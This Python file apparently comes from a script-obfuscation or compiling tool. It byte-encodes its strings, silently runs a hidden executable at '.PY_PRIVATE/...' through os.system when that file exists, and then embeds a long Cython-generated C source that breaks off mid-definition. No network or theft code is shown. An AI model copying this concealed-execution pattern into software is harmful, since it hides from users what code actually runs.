
import os
import sys

PSH_TEAM_KEY = bytes([216, 168, 216, 174, 32, 240, 159, 145, 128]).decode()

EXECUTE_FILE = bytes([46, 80, 89, 95, 80, 82, 73, 86, 65, 84, 69, 47, 50, 48, 50, 53, 48, 56, 50, 51, 48, 48, 48, 55, 48, 57, 56, 50, 49]).decode()
PREFIX = sys.prefix
EXPORT_PYTHONHOME = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 72, 79, 77, 69, 61]).decode()+PREFIX
EXPORT_PYTHON_EXECUTABLE = bytes([101, 120, 112, 111, 114, 116, 32, 80, 89, 84, 72, 79, 78, 95, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 61]).decode()+sys.executable

RUN = bytes([46, 47]).decode()+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+bytes([32, 38, 38, 32]).decode()+EXPORT_PYTHON_EXECUTABLE+bytes([32, 38, 38, 32]).decode()+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
